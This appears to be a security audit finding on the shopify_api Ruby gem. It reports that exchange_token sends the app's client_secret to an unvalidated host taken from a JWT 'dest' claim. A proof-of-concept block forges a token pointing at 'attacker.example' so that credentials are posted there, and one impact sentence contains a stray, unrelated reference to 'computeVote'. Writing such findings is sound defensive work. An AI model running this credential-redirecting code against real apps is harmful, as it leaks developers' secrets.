This is confirmed: `migrate_to_expiring_token` explicitly validates the `shop` argument with `Utils::ShopValidator.sanitize!(shop)` before constructing the outbound `HttpClient`, but `exchange_token` does not apply the same validation to `dest_shop`, which is parsed directly from the JWT's `dest` claim and used as the destination host that receives the `client_secret`.

### Title
Token exchange sends `client_secret` to an unvalidated host derived from the JWT `dest` claim - (File: lib/shopify_api/auth/token_exchange.rb)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` derives the destination host for the outbound `client_secret`-bearing HTTP request solely from the `dest` claim of the caller-supplied session token, without passing it through `Utils::ShopValidator`, unlike the sibling method `migrate_to_expiring_token` which validates its `shop` argument with `Utils::ShopValidator.sanitize!`.

### Finding Description
In `exchange_token`, `dest_shop` is taken directly from `ShopifyAPI::Auth::JwtPayload#shop`: [1](#0-0) , which simply strips `"https://"` from the token's `dest` claim with no domain allow-listing: [2](#0-1) . That value is used to build the session and `HttpClient`, whose `base_uri` becomes `https://#{session.shop}`: [3](#0-2) , and the app's `client_id`/`client_secret` are placed in the POST body sent to that host: [4](#0-3) .

By contrast, `migrate_to_expiring_token` treats the `shop` parameter as untrusted and requires it to resolve to a member of `ShopValidator::TRUSTED_SHOPIFY_DOMAINS` (or the configured `myshopify_domain`) before it is used to build the request host: [5](#0-4) , [6](#0-5) . This is a direct precedent in the same file showing the library's intended invariant: `host used for outbound client_secret request == a Shopify-trusted domain`. `exchange_token` breaks that equality by using the raw `dest` claim unchecked.

### Impact Explanation
If this invariant is broken, `client_secret` (and `client_id`) can be sent, in a network request initiated by the gem itself, to a host equal to whatever string is present in the token's `dest` claim rather than a verified `*.myshopify.com`/trusted Shopify domain. This matches the rules' explicitly in-scope High-impact category: "SSRF with the app's credentials." The verification gap is precisely between "JWT signature validated" (bytes/signature check) and "claim value trusted for use as a network destination without being bound to a known-good domain allow-list" — the same bug class as `computeVote` doing too much unchecked work in one place, here manifesting as one validation step (`ShopValidator`) being silently dropped for one of two structurally identical code paths in `token_exchange.rb`.

### Likelihood Explanation
Exploitation requires possession of a session token whose signature validates against the app's `api_secret_key` (or `old_api_secret_key`) — i.e., a token that Shopify or the app itself would consider legitimately signed. Whether the `dest` claim's value can be attacker-influenced to an arbitrary non-Shopify host depends on how/where the token was minted (e.g., via `JWT.encode` in a context outside strict Shopify issuance, or replay/relay scenarios), which I could not fully verify from this index alone — `JwtPayload` only checks `aud == Context.api_key`, `exp`/`nbf` and signature, and does **not** check that `dest`/`iss` is a real `*.myshopify.com` host. This is a real gap in defense-in-depth regardless of how the token was obtained, since the analogous method in the same file treats the shop value as adversarial input and validates it, while this one does not.

### Recommendation
In `ShopifyAPI::Auth::TokenExchange.exchange_token`, validate `dest_shop` with `Utils::ShopValidator.sanitize!(dest_shop)` (mirroring `migrate_to_expiring_token`) before constructing `shop_session`/`HttpClient`, and raise `Errors::InvalidShopError` for any value that doesn't resolve to a trusted Shopify domain. Additionally, consider having `JwtPayload` itself enforce that `dest`/`iss` are trusted Shopify hosts at decode time, so all consumers get this guarantee for free.

### Proof of Concept
```ruby
# Conceptual: assuming a session token can be obtained/crafted whose
# signature validates (e.g. signed with the app's api_secret_key) but whose
# `dest` claim is not a genuine Shopify domain:
payload = {
  iss: "https://attacker.example/admin",
  dest: "https://attacker.example",   # not sanitized anywhere in exchange_token
  aud: ShopifyAPI::Context.api_key,
  sub: "1", exp: (Time.now + 10).to_i, nbf: 1234, iat: 1234, jti: "x",
}
forged_token = JWT.encode(payload, ShopifyAPI::Context.api_secret_key, "HS256")

# exchange_token will POST { client_id, client_secret, ... } to
# https://attacker.example/admin/oauth/access_token
ShopifyAPI::Auth::TokenExchange.exchange_token(
  session_token: forged_token,
  requested_token_type: ShopifyAPI::Auth::TokenExchange::RequestedTokenType::OFFLINE_ACCESS_TOKEN,
)
```
Compare with `migrate_to_expiring_token(shop: "attacker.example", ...)`, which is already covered by a test asserting it raises `Errors::InvalidShopError` for exactly this kind of non-Shopify domain: [7](#0-6) . No equivalent test or guard exists for `exchange_token`'s `dest_shop`.

### Citations

**File:** lib/shopify_api/auth/token_exchange.rb (L40-41)
```ruby
          jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
          dest_shop = jwt_payload.shop
```

**File:** lib/shopify_api/auth/token_exchange.rb (L51-65)
```ruby
          shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: session_token,
            subject_token_type: ID_TOKEN_TYPE,
            requested_token_type: requested_token_type.serialize,
          }

          if requested_token_type == RequestedTokenType::OFFLINE_ACCESS_TOKEN
            body.merge!({ expiring: ShopifyAPI::Context.expiring_offline_access_tokens ? 1 : 0 })
          end

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/token_exchange.rb (L103-115)
```ruby
          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: non_expiring_offline_token,
            subject_token_type: RequestedTokenType::OFFLINE_ACCESS_TOKEN.serialize,
            requested_token_type: RequestedTokenType::OFFLINE_ACCESS_TOKEN.serialize,
            expiring: "1",
          }

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/jwt_payload.rb (L47-50)
```ruby
      sig { returns(String) }
      def shop
        @dest.gsub("https://", "")
      end
```

**File:** lib/shopify_api/clients/http_client.rb (L16-19)
```ruby
        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```

**File:** lib/shopify_api/utils/shop_validator.rb (L9-18)
```ruby
      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )
```

**File:** test/auth/token_exchange_test.rb (L258-265)
```ruby
      def test_migrate_to_expiring_token_rejects_non_shopify_domain
        assert_raises(ShopifyAPI::Errors::InvalidShopError) do
          ShopifyAPI::Auth::TokenExchange.migrate_to_expiring_token(
            shop: "attacker.example",
            non_expiring_offline_token: "old-offline-token-123",
          )
        end
      end
```
